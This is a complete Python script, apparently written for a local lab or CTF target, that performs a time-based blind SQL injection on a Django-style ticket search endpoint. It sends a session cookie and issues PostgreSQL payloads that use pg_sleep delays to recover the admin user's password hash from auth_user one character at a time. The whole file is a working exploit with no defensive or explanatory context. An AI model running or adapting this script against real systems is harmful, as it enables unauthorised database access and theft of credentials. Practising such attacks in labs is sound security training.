import requests
import string

URL = "http://127.0.0.1:5001/tickets/search/"
COOKIES = {"sessionid": "xwtf828dz9j8np6qyhxhniq18d8a4eyr"}

# Characters that may appear in the target value.
CHARSET = (
    string.ascii_letters +
    string.digits +
    "$_./=-+"
)

def is_true(response):
    return response.elapsed.total_seconds() > 2

known = ""

for position in range(1, 200):

    found = False

    for candidate in CHARSET:

        # Build a test condition for:
        # "Is the character at this position equal to candidate?"
        test_string = f"non' OR 1 = CASE WHEN substr((SELECT password FROM auth_user WHERE username='admin'),{position},1)='{candidate}' THEN (SELECT 1 FROM pg_sleep(3)) ELSE 2 END--"

        response = requests.get(URL, params={"q": test_string}, cookies=COOKIES,timeout=10)

        if is_true(response):
            known += candidate
            found = True

            print(f"[+] Position {position}: {candidate}")
            print(f"[+] Known so far: {known}")
            break

    # Nothing in our charset matched this position.
    # Assume we've reached the end.
    if not found:
        print("[*] No matching character. Stopping.")
        break

print(f"\nResult: {known}")
